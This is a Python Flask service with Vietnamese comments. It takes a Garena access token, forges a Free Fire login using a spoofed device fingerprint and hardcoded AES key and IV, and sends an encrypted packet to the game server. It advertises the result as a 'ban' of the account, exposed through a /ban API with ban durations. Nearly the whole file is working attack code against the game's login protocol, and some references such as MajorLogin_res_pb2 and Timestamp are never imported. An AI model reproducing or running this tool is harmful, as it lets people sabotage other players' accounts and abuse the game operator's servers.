from flask import Flask, request, jsonify, send_file
import requests
import base64
import json
import time
import socket
import urllib.parse
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import warnings
warnings.filterwarnings('ignore')

app = Flask(__name__)

# ====== MÀU ======
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)   
    
    @staticmethod
    def decode_varint(data, start_index=0):
        value = 0
        shift = 0
        index = start_index
        while index < len(data):
            byte = data[index]
            index += 1
            value |= (byte & 0x7F) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return value, index    
    
    @staticmethod
    def parse_protobuf(data):
        result = {}
        index = 0        
        while index < len(data):
            if index >= len(data):
                break
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1            
            if wire_type == 0:
                value, index = SimpleProtobuf.decode_varint(data, index)
                result[field_num] = value
            elif wire_type == 2:
                length, index = SimpleProtobuf.decode_varint(data, index)
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        result[field_num] = value_bytes.decode('utf-8')
                    except:
                        result[field_num] = value_bytes
            else:
                break        
        return result    
    
    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')        
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        result.extend(SimpleProtobuf.encode_varint(len(value)))
        result.extend(value)
        return bytes(result)   
    
    @staticmethod
    def encode_int32(field_number, value):
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
        result.extend(SimpleProtobuf.encode_varint(value))
        return bytes(result)   
    
    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        payload = bytearray()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, current_time))
        payload.extend(SimpleProtobuf.encode_string(4, 'free fire'))
        payload.extend(SimpleProtobuf.encode_int32(5, 1))
        payload.extend(SimpleProtobuf.encode_string(7, '1.128.9'))
        payload.extend(SimpleProtobuf.encode_string(8, 'Android OS 12 / API-31 (SP1A.210812.016/V13.0.8.0.SJHCNXM)'))
        payload.extend(SimpleProtobuf.encode_string(9, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(10, 'O2'))
        payload.extend(SimpleProtobuf.encode_string(11, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_int32(12, 1666))
        payload.extend(SimpleProtobuf.encode_int32(13, 750))
        payload.extend(SimpleProtobuf.encode_string(14, '440'))
        payload.extend(SimpleProtobuf.encode_string(15, 'ARM64 FP ASIMD AES | 2600 | 8'))
        payload.extend(SimpleProtobuf.encode_int32(16, 5479))
        payload.extend(SimpleProtobuf.encode_string(17, 'Mali-G57 MC5'))
        payload.extend(SimpleProtobuf.encode_string(18, 'OpenGL ES 3.2 v1.r32p1-00bet5.e94274a04d1e4e37d3804a00cb1f4074'))
        payload.extend(SimpleProtobuf.encode_string(19, 'Google|21cd1993-491c-45f0-9aee-f4bf86b9245b'))
        payload.extend(SimpleProtobuf.encode_string(20, '192.168.1.100'))
        payload.extend(SimpleProtobuf.encode_string(21, 'vi'))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(24, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(25, 'Xiaomi M2004J7AC'))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_int32(30, 1))
        payload.extend(SimpleProtobuf.encode_string(41, 'O2'))
        payload.extend(SimpleProtobuf.encode_string(42, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_string(57, '7428b253defc164018c604a1ebbfebdf'))
        payload.extend(SimpleProtobuf.encode_int32(60, 48520))
        payload.extend(SimpleProtobuf.encode_int32(61, 28119))
        payload.extend(SimpleProtobuf.encode_int32(62, 4498))
        payload.extend(SimpleProtobuf.encode_int32(63, 0))
        payload.extend(SimpleProtobuf.encode_int32(64, 28263))
        payload.extend(SimpleProtobuf.encode_int32(65, 48520))
        payload.extend(SimpleProtobuf.encode_int32(66, 28263))
        payload.extend(SimpleProtobuf.encode_int32(67, 48520))
        payload.extend(SimpleProtobuf.encode_int32(73, 2))
        payload.extend(SimpleProtobuf.encode_string(74, '/data/app/~~iMOsnrV6G19kswoTGJGYgQ==/com.dts.freefireth-SFAA3QulcKsIN_SWyri7zA==/lib/arm64'))
        payload.extend(SimpleProtobuf.encode_int32(76, 1))
        payload.extend(SimpleProtobuf.encode_string(77, '17e6a447803a17e4f59e3fd734efc5ae|/data/app/~~iMOsnrV6G19kswoTGJGYgQ==/com.dts.freefireth-SFAA3QulcKsIN_SWyri7zA==/base.apk'))
        payload.extend(SimpleProtobuf.encode_int32(78, 3))
        payload.extend(SimpleProtobuf.encode_int32(79, 2))
        payload.extend(SimpleProtobuf.encode_string(81, '64'))
        payload.extend(SimpleProtobuf.encode_string(83, '2019120270'))
        payload.extend(SimpleProtobuf.encode_int32(85, 3))
        payload.extend(SimpleProtobuf.encode_string(86, 'OpenGLES2'))
        payload.extend(SimpleProtobuf.encode_int32(87, 255))
        payload.extend(SimpleProtobuf.encode_int32(88, 4))
        payload.extend(SimpleProtobuf.encode_string(90, 'Ha Noi'))
        payload.extend(SimpleProtobuf.encode_string(91, '22'))
        payload.extend(SimpleProtobuf.encode_int32(92, 4275))
        payload.extend(SimpleProtobuf.encode_string(93, 'android'))
        payload.extend(SimpleProtobuf.encode_string(94, 'KqsHT2CnbP+CILeOnb+OUB8t2RSH3z76xfxPgY7My2napifnqTdAvVbbxUjA1J8kEj6yUng+sn/m+Bl6rX6Gv+tto7A='))
        payload.extend(SimpleProtobuf.encode_int32(95, 111207))
        payload.extend(SimpleProtobuf.encode_int32(97, 1))
        payload.extend(SimpleProtobuf.encode_int32(98, 1))
        payload.extend(SimpleProtobuf.encode_string(99, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(100, str(platform)))
        payload.extend(SimpleProtobuf.encode_int32(101, 1))
        payload.extend(SimpleProtobuf.encode_string(102, 'GLAVY\x09\x04N\x01\x0c\x13\x0f\x04@^A9YS\x0fP[=\x0fQ[nR\t<\nT2'))
        payload.extend(SimpleProtobuf.encode_int32(103, 1))
        payload.extend(SimpleProtobuf.encode_int32(104, 0))
        return bytes(payload)

def b64url_decode(input_str: str) -> bytes:
    rem = len(input_str) % 4
    if rem:
        input_str += '=' * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def get_available_room(input_text):
    try:
        data = bytes.fromhex(input_text)
        result = {}
        index = 0        
        while index < len(data):
            if index >= len(data):
                break                
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1            
            if wire_type == 0:
                value = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    value |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                result[str(field_num)] = {"wire_type": "varint", "data": value}                
            elif wire_type == 2:
                length = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7                
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        value_str = value_bytes.decode('utf-8')
                        result[str(field_num)] = {"wire_type": "string", "data": value_str}
                    except:
                        result[str(field_num)] = {"wire_type": "bytes", "data": value_bytes.hex()}
            else:
                break                
        return json.dumps(result)
    except Exception as e:
        return None

def extract_jwt_payload_dict(jwt_s: str):
    try:
        parts = jwt_s.split('.')
        if len(parts) < 2:
            return None
        payload_b64 = parts[1]
        payload_bytes = b64url_decode(payload_b64)
        payload = json.loads(payload_bytes.decode('utf-8', errors='ignore'))
        if isinstance(payload, dict):
            return payload
    except Exception:
        pass
    return None

def encrypt_packet(hex_string: str, aes_key, aes_iv) -> str:
    if isinstance(aes_key, str):
        aes_key = bytes.fromhex(aes_key)
    if isinstance(aes_iv, str):
        aes_iv = bytes.fromhex(aes_iv)   
    data = bytes.fromhex(hex_string)
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted.hex()

def build_start_packet(account_id: int, timestamp: int, jwt: str, key, iv) -> str:
    try:
        encrypted = encrypt_packet(jwt.encode().hex(), key, iv)
        head_len = hex(len(encrypted) // 2)[2:]
        ide_hex = hex(int(account_id))[2:]
        zeros = "0" * (16 - len(ide_hex))
        timestamp_hex = hex(timestamp)[2:].zfill(2)
        head = f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len}"
        start_packet = head + encrypted        
        return start_packet
    except Exception as e:
        return None

def send_once(remote_ip, remote_port, payload_bytes, recv_timeout=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(recv_timeout)
    try:
        s.connect((remote_ip, remote_port))
        s.sendall(payload_bytes)        
        chunks = []
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        
        return b"".join(chunks)
    finally:
        s.close()

def ban_account(access_token):
    print(f"{colors.CYAN}[*] Checking token...{colors.RESET}")
    
    inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
    inspect_headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "100067.connect.garena.com",
        "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"
    }
    
    try:
        resp = requests.get(inspect_url, headers=inspect_headers, timeout=10)
        data = resp.json()
        if 'error' in data:
            print(f"{colors.RED}[!] Token error: {data.get('error')}{colors.RESET}")
            return False
    except Exception as e:
        print(f"{colors.RED}[!] Failed to inspect token: {str(e)}{colors.RESET}")
        return False
    
    NEW_OPEN_ID = data.get('open_id')
    platform_ = data.get('platform')
    
    # Lấy UID + Nickname
    try:
        if '.' in access_token:
            parts = access_token.split('.')
            if len(parts) >= 2:
                payload_b64 = parts[1]
                while len(payload_b64) % 4 != 0:
                    payload_b64 += '='
                decoded = json.loads(base64.urlsafe_b64decode(payload_b64))
                account_id = decoded.get('account_id', 'N/A')
                nickname = decoded.get('nickname', 'N/A')
                try:
                    nickname = base64.b64decode(nickname).decode('utf-8', errors='ignore')
                except:
                    pass
                print(f"{colors.GREEN}[✓] Account ID: {account_id}{colors.RESET}")
                print(f"{colors.GREEN}[✓] Nickname: {nickname}{colors.RESET}")
        else:
            account_id = data.get('uid', 'N/A')
            nickname = "Không xác định"
            print(f"{colors.GREEN}[✓] Account ID: {account_id}{colors.RESET}")
    except:
        account_id = data.get('uid', 'N/A')
        nickname = "Không xác định"
        print(f"{colors.GREEN}[✓] Account ID: {account_id}{colors.RESET}")
    
    print(f"{colors.GREEN}[✓] Open ID: {NEW_OPEN_ID}{colors.RESET}")
    print(f"{colors.GREEN}[✓] Platform: {platform_}{colors.RESET}")
    
    print(f"{colors.CYAN}[*] MajorLogin...{colors.RESET}")
    
    key = b'Yg&tc%DEuh6%Zc^8'
    iv = b'6oyZDr22E3ychjM%'
    
    MajorLogin_url = "https://loginbp.ggpolarbear.com/MajorLogin"
    MajorLogin_headers = {
        "User-Agent": "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-GA": "v1 1",
        "X-Unity-Version": "2022.3.47f1",
        "ReleaseVersion": "OB54"
    }
    
    data_pb = SimpleProtobuf.create_login_payload(NEW_OPEN_ID, access_token, str(platform_))
    data_padded = pad(data_pb, 16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    enc_data = cipher.encrypt(data_padded)
    
    try:
        response = requests.post(MajorLogin_url, headers=MajorLogin_headers, data=enc_data, timeout=15)
        if response.status_code != 200:
            print(f"{colors.RED}[!] MajorLogin error: {response.status_code}{colors.RESET}")
            return False
        print(f"{colors.GREEN}[✓] MajorLogin OK{colors.RESET}")
    except Exception as e:
        print(f"{colors.RED}[!] MajorLogin failed: {str(e)}{colors.RESET}")
        return False
    
    resp_enc = response.content
    cipher_resp = AES.new(key, AES.MODE_CBC, iv)
    resp_msg = MajorLogin_res_pb2.MajorLoginRes()
    parsed_data = None
    
    try:
        resp_dec = unpad(cipher_resp.decrypt(resp_enc), 16)
        resp_msg.ParseFromString(resp_dec)
        parsed_data = SimpleProtobuf.parse_protobuf(resp_dec)
    except Exception:
        resp_msg.ParseFromString(resp_enc)
        parsed_data = SimpleProtobuf.parse_protobuf(resp_enc)
    
    field_21_value = parsed_data.get(21, None)
    if field_21_value:
        ts = Timestamp()
        ts.FromNanoseconds(field_21_value)
        timetamp = ts.seconds * 1_000_000_000 + ts.nanos
    else:
        payload = extract_jwt_payload_dict(resp_msg.account_jwt)
        exp = int(payload.get("exp", 0))
        ts = Timestamp()
        ts.FromNanoseconds(exp * 1_000_000_000)
        timetamp = ts.seconds * 1_000_000_000 + ts.nanos
    
    print(f"{colors.CYAN}[*] GetLoginData...{colors.RESET}")
    
    GetLoginData_resURL = "https://clientbp.ggpolarbear.com/GetLoginData"
    GetLoginData_res_headers = {
        'Authorization': f'Bearer {resp_msg.account_jwt}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': 'OB54',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    
    try:
        r2 = requests.post(GetLoginData_resURL, headers=GetLoginData_res_headers, data=enc_data, timeout=12, verify=False)
        if r2.status_code != 200:
            print(f"{colors.RED}[!] GetLoginData error: {r2.status_code}{colors.RESET}")
            return False
        print(f"{colors.GREEN}[✓] GetLoginData OK{colors.RESET}")
    except Exception as e:
        print(f"{colors.RED}[!] GetLoginData failed: {str(e)}{colors.RESET}")
        return False
    
    online_ip = None
    online_port = None
    
    try:
        x = r2.content.hex()
        json_result = get_available_room(x)
        
        if json_result:
            parsed_data_login = json.loads(json_result)
            
            if '14' in parsed_data_login and 'data' in parsed_data_login['14']:
                online_address = parsed_data_login['14']['data']
                online_ip = online_address[:len(online_address) - 6]
                online_port = int(online_address[len(online_address) - 5:])
                print(f"{colors.GREEN}[✓] Online IP: {online_ip}:{online_port}{colors.RESET}")
            else:
                print(f"{colors.RED}[!] Could not find server address{colors.RESET}")
                return False
        else:
            print(f"{colors.RED}[!] Failed to parse GetLoginData response{colors.RESET}")
            return False
    except Exception as e:
        print(f"{colors.RED}[!] Error processing response: {str(e)}{colors.RESET}")
        return False
    
    payload_jwt = extract_jwt_payload_dict(resp_msg.account_jwt)
    if payload_jwt is None:
        print(f"{colors.RED}[!] Failed to decode JWT{colors.RESET}")
        return False
    
    account_id = int(payload_jwt.get("account_id", 0))
    final_token_hex = build_start_packet(
        account_id=account_id,
        timestamp=timetamp,
        jwt=resp_msg.account_jwt,
        key=resp_msg.key,
        iv=resp_msg.iv)
    
    if not final_token_hex:
        print(f"{colors.RED}[!] Failed to build packet{colors.RESET}")
        return False
    
    print(f"{colors.CYAN}[*] Sending ban packet...{colors.RESET}")
    
    try:
        payload_bytes = bytes.fromhex(final_token_hex)
        response = send_once(online_ip, online_port, payload_bytes, recv_timeout=5.0)    
        if response:
            print(f"{colors.GREEN}[✓] Ban Successfully!{colors.RESET}")
            return True
        else:
            print(f"{colors.RED}[!] No response from server{colors.RESET}")
            return False
    except Exception as e:
        print(f"{colors.RED}[!] Connection error: {str(e)}{colors.RESET}")
        return False

# ====== API BAN ======
@app.route('/ban', methods=['GET'])
def ban_api():
    access_token = request.args.get('access_token')
    ban_type = request.args.get('type', '3day')
    
    if not access_token:
        return jsonify({"success": False, "error": "Missing access_token"})
    
    try:
        # Lấy thông tin token
        inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
        inspect_headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100067.connect.garena.com",
            "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"
        }
        resp = requests.get(inspect_url, headers=inspect_headers, timeout=10)
        data = resp.json()
        
        if 'error' in data:
            return jsonify({"success": False, "error": data.get('error')})
        
        # Lấy UID + Nickname
        account_id = 'N/A'
        nickname = 'Không xác định'
        try:
            if '.' in access_token:
                parts = access_token.split('.')
                if len(parts) >= 2:
                    payload_b64 = parts[1]
                    while len(payload_b64) % 4 != 0:
                        payload_b64 += '='
                    decoded = json.loads(base64.urlsafe_b64decode(payload_b64))
                    account_id = decoded.get('account_id', 'N/A')
                    nickname = decoded.get('nickname', 'N/A')
                    try:
                        nickname = base64.b64decode(nickname).decode('utf-8', errors='ignore')
                    except:
                        pass
            else:
                account_id = data.get('uid', 'N/A')
        except:
            account_id = data.get('uid', 'N/A')
        
        # Gọi hàm ban
        result = ban_account(access_token)
        
        if result:
            return jsonify({
                "success": True,
                "uid": account_id,
                "nickname": nickname,
                "ban_type": ban_type,
                "message": f"Ban {ban_type} thành công!"
            })
        else:
            return jsonify({"success": False, "error": "Ban thất bại!"})
            
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/')
def index():
    return send_file('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
